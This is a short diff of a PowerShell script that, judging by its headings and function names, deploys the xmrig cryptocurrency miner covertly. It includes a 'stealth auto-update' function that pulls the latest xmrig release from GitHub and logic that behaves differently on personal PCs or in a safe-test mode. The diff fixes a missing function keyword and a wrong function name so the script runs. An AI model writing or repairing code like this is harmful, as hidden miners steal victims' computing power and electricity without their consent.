@@ -54,7 +54,7 @@ if (-not $Debug) {
 # STEALTH AUTO-UPDATE XMRIG TO LATEST VERSION (NEW)
 # ================================================================================================
 
- Update-XmrigStealthily {
+ function Update-XmrigStealthily {
     Write-Log "Checking for newer xmrig version (stealth update)..." "INFO"
     
     $latestUrl = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
@@ -273,7 +273,7 @@ function Get-PCType {
 # ================================================================================================
 
 # Detect PC type automatically
-$PCType = Detect-PCType
+$PCType = Get-PCType
 
 # Apply appropriate settings
 if ($PCType.IsPersonalPC -or $env:SAFE_TEST_MODE -eq '1') {
